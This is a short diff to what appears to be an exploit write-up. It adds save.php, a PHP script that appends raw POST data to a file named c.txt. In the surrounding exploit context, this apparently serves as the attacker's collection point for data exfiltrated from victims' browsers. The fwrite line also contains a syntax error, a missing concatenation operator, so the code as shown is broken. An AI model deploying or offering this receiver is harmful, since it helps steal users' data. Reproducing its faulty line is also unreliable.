@@ -57,5 +57,19 @@ if (exploitWindow.closed) {
 
 save.php:
 ```PHP
-
+<?php
+$data = file_get_contents('php://input');
+if (!empty($data)) {
+    $file = fopen("c.txt", "a");
+    if ($file) {
+        $json_data = json_encode($data);
+        fwrite($file, $json_data ? $json_data PHP_EOL : $data. PHP_EOL);
+        fclose($file);
+        echo "POST data saved successfully!";
+    } else {
+        echo "Error opening file for writing.";
+    }
+} else {
+    echo "No POST data received.";
+}
 ```
